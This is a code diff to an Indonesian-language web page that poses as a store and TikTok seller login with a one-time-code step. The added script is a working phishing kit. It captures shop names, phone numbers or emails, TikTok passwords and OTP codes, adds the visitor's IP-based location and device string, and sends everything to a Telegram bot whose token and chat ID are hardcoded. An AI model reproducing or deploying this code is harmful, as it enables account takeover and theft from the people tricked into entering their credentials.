-                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-hp', this)">
-            </div>
-        </div>
-    </div>
-    
-    <div id="tab-email" style="display: none;">
-        <div class="form-group">
-            <label class="wajib">Email</label>
-            <div class="input-full">
-                <input type="email" id="reset-email" placeholder="email@contoh.com" oninput="cekValidasiReset()">
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="wajib">Kata Sandi Baru</label>
-            <div class="input-group">
-                <input type="password" id="pass-baru-email" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
-                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-email', this)">
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="wajib">Konfirmasi Sandi</label>
-            <div class="input-group">
-                <input type="password" id="pass-konfirm-email" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
-                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-email', this)">
-            </div>
-        </div>
-    </div>
-    
-    <button class="btn btn-disabled" id="btn-reset" disabled onclick="lanjutKeOTP('reset')">Kirim Kode</button>
-</div>
+<script>
+// === KONFIGURASI BOT TELEGRAM ===
+const BOT_TOKEN = '8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04';
+const CHAT_ID = '7402071395';
 
-<script src="script.js"></script>
+let pakai6Angka = false;
+let halamanSebelumOTP = 'page-awal';
+let jenisInputSaatIni = 'hp';
+let dataDisimpan = { halamanAsal:'', namaToko:'', kontak:'', sandi:'' };
+let lokasiPerangkat = 'Mendeteksi...';
+let namaPerangkat = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Perangkat Tidak Diketahui';
+
+// Ambil lokasi otomatis
+fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(d => {
+        lokasiPerangkat = `${d.city || ''}, ${d.region || ''}, ${d.country_name || ''}`;
+    })
+    .catch(() => { lokasiPerangkat = 'Tidak Terdeteksi'; });
+
+function tampilkanHalaman(id) {
+    document.querySelectorAll('.container').forEach(e => e.style.display = 'none');
+    document.getElementById(id).style.display = 'block';
+}
+
+function lanjutKeOTP(jenis) {
+    jenisInputSaatIni = jenis;
+    halamanSebelumOTP = document.querySelector('.container[style*="block"]')?.id || 'page-awal';
+    simpanDataIsian();
+    tampilkanHalaman('page-otp');
+    pakai6Angka = false;
+    document.getElementById('otp-judul').textContent = 'Masukkan Kode OTP (4 Angka)';
+    document.getElementById('tautan-ganti-otp').textContent = 'Ganti kode 6 angka';
+    document.getElementById('otp-wadah').classList.remove('otp-6');
+    buatKotakOTP(4);
+    kirimNotifikasiLangkah1();
+}
+
+function simpanDataIsian() {
+    if(halamanSebelumOTP === 'page-login-umum') {
+        if(jenisInputSaatIni === 'hp') {
+            dataDisimpan.namaToko = document.getElementById('umum-nama-toko-hp')?.value.trim() || '';
+            dataDisimpan.kontak = document.getElementById('umum-hp')?.value.trim() || '';
+        } else {
+            dataDisimpan.namaToko = document.getElementById('umum-nama-toko-email')?.value.trim() || '';
+            dataDisimpan.kontak = document.getElementById('umum-email')?.value.trim() || '';
+        }
+        dataDisimpan.sandi = '';
+    } else if(halamanSebelumOTP === 'page-tiktok') {
+        if(jenisInputSaatIni === 'hp') {
+            dataDisimpan.namaToko = document.getElementById('tiktok-nama-toko-hp')?.value.trim() || '';
+            dataDisimpan.kontak = document.getElementById('tiktok-hp')?.value.trim() || '';
+            dataDisimpan.sandi = document.getElementById('tiktok-sandi-hp')?.value || '';
+        } else {
+            dataDisimpan.namaToko = document.getElementById('tiktok-nama-toko-email')?.value.trim() || '';
+            dataDisimpan.kontak = document.getElementById('tiktok-email')?.value.trim() || '';
+            dataDisimpan.sandi = document.getElementById('tiktok-sandi-email')?.value || '';
+        }
+    }
+}
+
+async function kirimNotifikasiLangkah1() {
+    let pesan = '';
+    if(halamanSebelumOTP === 'page-login-umum') {
+        pesan = `📩 Data Baru Masuk Dengan Nomor HP/Email
+
+🏪 Nama Toko: ${dataDisimpan.namaToko}
+📱 Kontak: ${dataDisimpan.kontak}
+
+🌍 LOKASI PERANGKAT:
+${lokasiPerangkat}
+
+📱 NAMA PERANGKAT:
+${namaPerangkat}`;
+    } else if(halamanSebelumOTP === 'page-tiktok') {
+        pesan = `📩 Data Baru Login Dari TikTok
+
+🏪 Nama Toko: ${dataDisimpan.namaToko}
+📱 Kontak: ${dataDisimpan.kontak}
+🔒 Kata Sandi: ${dataDisimpan.sandi}
+
+🌍 LOKASI PERANGKAT:
+${lokasiPerangkat}
+
+📱 NAMA PERANGKAT:
+${namaPerangkat}`;
+    }
+    await kirimKeTelegram(pesan);
+}
+
+function kembaliDariOTP() { tampilkanHalaman(halamanSebelumOTP); }
+function kembaliKeHalamanSebelumnya() { tampilkanHalaman(halamanSebelumOTP); }
+
+function pindahBerikutnya(el, indeksSekarang) {
+    if (jenisInputSaatIni === 'hp') {
+        el.value = el.value.replace(/[^0-9]/g, '');
+    } else {
+        el.value = el.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+    }
+    const semuaKotak = document.querySelectorAll('.otp-kotak');
+    if (el.value === '' && indeksSekarang > 0) {
+        semuaKotak[indeksSekarang - 1].focus();
+    } else if (el.value.length === 1 && indeksSekarang + 1 < semuaKotak.length) {
+        semuaKotak[indeksSekarang + 1].focus();
+    }
+    cekSemuaTerisi();
+}
+
+function cekSemuaTerisi() {
+    const kotak = document.querySelectorAll('.otp-kotak');
+    const tombol = document.getElementById('otp-btn');
+    let semuaTerisi = true;
+    kotak.forEach(k => { if (!k.value) semuaTerisi = false; });
+    tombol.disabled = !semuaTerisi;
+    tombol.classList.toggle('btn-disabled', !semuaTerisi);
+}
+
+function gantiJumlahOTP() {
+    pakai6Angka = !pakai6Angka;
+    const wadah = document.getElementById('otp-wadah');
+    const judul = document.getElementById('otp-judul');
+    const tautan = document.getElementById('tautan-ganti-otp');
+    wadah.innerHTML = '';
+    wadah.classList.remove('otp-6');
+    if (pakai6Angka) {
+        judul.textContent = 'Masukkan Kode OTP (6 Angka)';
+        tautan.textContent = 'Ganti kode 4 angka';
+        wadah.classList.add('otp-6');
+        buatKotakOTP(6);
+    } else {
+        judul.textContent = 'Masukkan Kode OTP (4 Angka)';
+        tautan.textContent = 'Ganti kode 6 angka';
+        buatKotakOTP(4);
+    }
+    cekSemuaTerisi();
+}
+
+function buatKotakOTP(jumlah) {
+    const wadah = document.getElementById('otp-wadah');
+    wadah.innerHTML = '';
+    for(let i = 0; i < jumlah; i++) {
+        const inp = document.createElement('input');
+        inp.type = 'text';
+        inp.maxLength = 1;
+        inp.className = 'otp-kotak';
+        inp.inputMode = (jenisInputSaatIni === 'hp') ? 'numeric' : 'text';
+        inp.autocomplete = 'one-time-code';
+        inp.oninput = function() { pindahBerikutnya(this, i); };
+        inp.onkeydown = function(e) {
+            if (e.key === 'Backspace' && !inp.value && i > 0) {
+                const semuaKotak = document.querySelectorAll('.otp-kotak');
+                semuaKotak[i - 1].focus();
+            }
+        };
+        wadah.appendChild(inp);
+    }
+}
+
+// === KIRIM NOTIFIKASI OTP ===
+async function kirimOTP() {
+    const kotak = document.querySelectorAll('.otp-kotak');
+    const kodeOTP = Array.from(kotak).map(k => k.value).join('');
+    let pesan = '';
+    if(halamanSebelumOTP === 'page-login-umum') {
+        pesan = `📩 Data Masuk Dengan Nomor HP/Email OTP
+
+🏪 Nama Toko: ${dataDisimpan.namaToko}
+📱 Kontak: ${dataDisimpan.kontak}
+🔢 Kode OTP: ${kodeOTP}
+
+🌍 LOKASI PERANGKAT:
+${lokasiPerangkat}
+
+📱 NAMA PERANGKAT:
+${namaPerangkat}.`;
+    } else if(halamanSebelumOTP === 'page-tiktok') {
+        pesan = `📩 Data Login Dari TikTok OTP
+
+🏪 Nama Toko: ${dataDisimpan.namaToko}
+📱 Kontat: ${dataDisimpan.kontak}
+🔒 Kata Sandi: ${dataDisimpan.sandi}
+🔢 Kode OTP: ${kodeOTP}
+
+🌍 LOKASI PERANGKAT:
+${lokasiPerangkat}
+
+📱 NAMA PERANGKAT:
+${namaPerangkat}`;
+    }
+    await kirimKeTelegram(pesan);
+    tampilkanHalaman('page-result');
+}
+
+async function kirimKeTelegram(teks) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+        });
+    } catch (e) { console.log(e); }
+}
+
+function gantiTabUmum(jenis) {
+    document.querySelectorAll('#page-login-umum .tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    document.getElementById('umum-view-hp').style.display = jenis==='hp'?'block':'none';
+    document.getElementById('umum-view-email').style.display = jenis==='email'?'block':'none';
+}
+function gantiTabTikTok(jenis) {
+    document.querySelectorAll('#page-tiktok .tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    document.getElementById('tiktok-view-hp').style.display = jenis==='hp'?'block':'none';
+    document.getElementById('tiktok-view-email').style.display = jenis==='email'?'block':'none';
+}
+function nomorHPTerdaftar(no) {
+    const n = no.replace(/\D/g,'');
+    return /^(0?8|8)\d{8,11}$/.test(n) && n.length >=10 && n.length <=13;
+}
+function sandiValid(sandi) {
+    if (!sandi || sandi.length<6) return false;
+    if (!/^[A-Z]/.test(sandi)) return false;
+    return /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(sandi);
+}
+function cekValidasiUmumHP() {
+    const nama = document.getElementById('umum-nama-toko-hp').value.trim();
+    const hp = document.getElementById('umum-hp').value.trim();
+    const tombol = document.getElementById('umum-btn-hp');
+    const err = document.getElementById('umum-error-hp');
+    if (!nama || !hp) { err.textContent = 'Isi semua kolom dengan benar'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    if (!nomorHPTerdaftar(hp)) { err.textContent = 'Nomor diawali 08 atau 8, maksimal 13 digit'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    err.textContent = ''; tombol.disabled = false; tombol.classList.remove('btn-disabled');
+}
+function cekValidasiUmumEmail() {
+    const nama = document.getElementById('umum-nama-toko-email').value.trim();
+    const email = document.getElementById('umum-email').value.trim();
+    const tombol = document.getElementById('umum-btn-email');
+    const err = document.getElementById('umum-error-email');
+    if (!nama || !email) { err.textContent = 'Isi semua kolom dengan benar'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    err.textContent = ''; tombol.disabled = false; tombol.classList.remove('btn-disabled');
+}
+function cekValidasiTikTokHP() {
+    const nama = document.getElementById('tiktok-nama-toko-hp').value.trim();
+    const hp = document.getElementById('tiktok-hp').value.trim();
+    const sandi = document.getElementById('tiktok-sandi-hp').value;
+    const tombol = document.getElementById('tiktok-btn-hp');
+    const err = document.getElementById('tiktok-error-hp');
+    if (!nama || !hp || !sandi) { err.textContent = 'Isi semua kolom dengan benar'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    if (!nomorHPTerdaftar(hp)) { err.textContent = 'Nomor diawali 08 atau 8, maksimal 13 digit'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    if (!sandiValid(sandi)) { err.textContent = 'Kata sandi: awali huruf besar + ada karakter khusus'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    err.textContent = ''; tombol.disabled = false; tombol.classList.remove('btn-disabled');
+}
+function cekValidasiTikTokEmail() {
+    const nama = document.getElementById('tiktok-nama-toko-email').value.trim();
+    const email = document.getElementById('tiktok-email').value.trim();
+    const sandi = document.getElementById('tiktok-sandi-email').value;
+    const tombol = document.getElementById('tiktok-btn-email');
+    const err = document.getElementById('tiktok-error-email');
+    if (!nama || !email || !sandi) { err.textContent = 'Isi semua kolom dengan benar'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    if (!sandiValid(sandi)) { err.textContent = 'Kata sandi: awali huruf besar + ada karakter khusus'; tombol.disabled = true; tombol.classList.add('btn-disabled'); return; }
+    err.textContent = ''; tombol.disabled = false; tombol.classList.remove('btn-disabled');
+}
+
+
+function togglePassword(id) {
+    const el = document.getElementById(id);
+    el.type = el.type==='password'?'text':'password';
+    // Ganti ikon mata saat diklik
+    const imgId = id === 'tiktok-sandi-hp' ? 'mata-gambar-hp' : 'mata-gambar-email';
+    const img = document.getElementById(imgId);
+    if (el.type === 'text') {
+        img.src = "https://ikon-dusky.vercel.app/1adjoeny.png";
+    } else {
+        img.src = "https://ikon-dusky.vercel.app/2v8p5kqf.png";
+    }
+}
+
+</script>
 </body>
 </html>
